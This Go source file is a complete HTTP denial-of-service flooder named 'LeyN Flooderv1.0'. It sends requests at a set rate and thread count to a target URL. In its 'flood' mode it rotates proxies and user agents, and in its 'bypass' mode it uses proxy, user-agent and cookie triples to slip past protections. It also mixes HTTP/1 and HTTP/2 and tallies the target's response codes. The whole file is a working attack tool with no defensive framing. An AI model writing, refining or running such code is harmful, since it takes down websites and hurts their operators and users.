package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/rs/zerolog"
	"github.com/rs/zerolog/log"
	"golang.org/x/net/http2"
)

var (
	successCount int64
	statusCode   = make(map[int]int)
	mu           sync.Mutex
	reset        = "\033[0m"
	yellow       = "\033[33m"
	green        = "\033[32m"
)

type RequestInfo struct {
	Proxy  string
	UA     string
	Cookie string
}

type RequestTask struct {
	Target string
	Method string
	Info   RequestInfo
	Ver    string
}

func main() {
	initLogger()

	if len(os.Args) != 8 {
		fmt.Println("Usage: ./program mode(GET/POST) URL duration(seconds) rate(req/sec) threads version(1/2/mix) method(flood/bypass)")
		return
	}

	method := os.Args[1]
	target := os.Args[2]
	duration, _ := strconv.Atoi(os.Args[3])
	rate, _ := strconv.Atoi(os.Args[4])
	threads, _ := strconv.Atoi(os.Args[5])
	httpVer := os.Args[6]
	mode := os.Args[7]

	fmt.Printf("%s[INFO] - LeyN Flooderv1.0%s\n", green, reset)

	title := getTitle(target)
	load := getLoad(mode)
	printBox([]string{
		fmt.Sprintf("Title : %s", title),
		fmt.Sprintf("Load  : %d", load),
		fmt.Sprintf("Method: %s / %s", mode, method),
	})

	fmt.Printf("\n%s[INFO] Flooder Running%s\n", green, reset)

	var requests []RequestInfo
	if mode == "flood" {
		proxies := readLines("proxy.txt")
		uas := readLines("ua.txt")
		for _, p := range proxies {
			requests = append(requests, RequestInfo{Proxy: p, UA: uas[rand.Intn(len(uas))]})
		}
	} else {
		lines := readLines("config.txt")
		for _, line := range lines {
			parts := strings.SplitN(line, " ", 3)
			if len(parts) == 3 {
				requests = append(requests, RequestInfo{Proxy: parts[0], UA: parts[1], Cookie: parts[2]})
			}
		}
	}

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	requestCh := make(chan RequestTask, threads*rate)
	proxyPool := buildProxyPool(requests)

	var wg sync.WaitGroup
	startWorkerPool(ctx, threads, requestCh, &wg)

	ticker := time.NewTicker(time.Second / time.Duration(rate))
	defer ticker.Stop()

	go func() {
		for {
			select {
			case <-ctx.Done():
				close(requestCh)
				return
			case <-ticker.C:
				reqInfo := <-proxyPool
				version := httpVer
				if version == "mix" {
					if rand.Intn(2) == 0 {
						version = "1"
					} else {
						version = "2"
					}
				}
				requestCh <- RequestTask{Target: target, Method: method, Info: reqInfo, Ver: version}
			}
		}
	}()

	go printStatus(ctx)
	wg.Wait()
}

func startWorkerPool(ctx context.Context, threads int, requestCh chan RequestTask, wg *sync.WaitGroup) {
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				case task, ok := <-requestCh:
					if !ok {
						return
					}
					sendRequest(task.Target, task.Method, task.Info, task.Ver)
				}
			}
		}()
	}
}

func buildProxyPool(infos []RequestInfo) chan RequestInfo {
	pool := make(chan RequestInfo, len(infos))
	go func() {
		for {
			for _, info := range infos {
				pool <- info
			}
		}
	}()
	return pool
}

func sendRequest(targetURL, method string, info RequestInfo, httpVer string) {
	proxyURL := http.ProxyURL(&url.URL{Scheme: "http", Host: info.Proxy})
	tr := &http.Transport{
		Proxy:           proxyURL,
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	if httpVer == "2" {
		http2.ConfigureTransport(tr)
	}
	client := &http.Client{Timeout: 5 * time.Second, Transport: tr}

	req, err := http.NewRequest(method, targetURL, nil)
	if err != nil {
		return
	}
	req.Header.Set("User-Agent", info.UA)
	if info.Cookie != "" {
		req.Header.Set("Cookie", info.Cookie)
	}

	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	mu.Lock()
	successCount++
	statusCode[resp.StatusCode]++
	mu.Unlock()
}

func readLines(path string) []string {
	file, err := os.Open(path)
	if err != nil {
		log.Fatal().Err(err).Str("file", path).Msg("failed to read file")
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		text := strings.TrimSpace(scanner.Text())
		if text != "" {
			lines = append(lines, text)
		}
	}
	return lines
}

func getTitle(url string) string {
	resp, err := http.Get(url)
	if err != nil {
		log.Warn().Err(err).Str("url", url).Msg("failed to get title")
		return "Unknown"
	}
	defer resp.Body.Close()

	buf := make([]byte, 4096)
	n, _ := resp.Body.Read(buf)
	body := string(buf[:n])
	start := strings.Index(body, "<title>")
	end := strings.Index(body, "</title>")
	if start != -1 && end != -1 && end > start {
		return body[start+7 : end]
	}
	return "No Title"
}

func getLoad(mode string) int {
	if mode == "flood" {
		return len(readLines("proxy.txt"))
	}
	return len(readLines("config.txt"))
}

func initLogger() {
	logFile, err := os.OpenFile("output.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)
	if err != nil {
		fmt.Println("Failed to open log file:", err)
		os.Exit(1)
	}
	consoleWriter := zerolog.ConsoleWriter{Out: os.Stdout, TimeFormat: "15:04:05"}
	multi := io.MultiWriter(consoleWriter, logFile)
	log.Logger = zerolog.New(multi).With().Timestamp().Logger()
}

func printBox(lines []string) {
	maxLen := 0
	for _, line := range lines {
		if len(line) > maxLen {
			maxLen = len(line)
		}
	}
	fmt.Printf("┌%s┐\n", strings.Repeat("─", maxLen+2))
	for _, line := range lines {
		padding := maxLen - len(line)
		fmt.Printf("│ %s%s │\n", line, strings.Repeat(" ", padding))
	}
	fmt.Printf("└%s┘\n", strings.Repeat("─", maxLen+2))
}

func printStatus(ctx context.Context) {
	for {
		select {
		case <-ctx.Done():
			return
		default:
			mu.Lock()
			var codes []int
			for code := range statusCode {
				codes = append(codes, code)
			}
			sort.Ints(codes)
			fmt.Printf("\r%s[Status] - {", yellow)
			for _, code := range codes {
				fmt.Printf("%d - %d ", code, statusCode[code])
			}
			fmt.Printf("}%s", reset)
			mu.Unlock()
			time.Sleep(1 * time.Second)
		}
	}
}
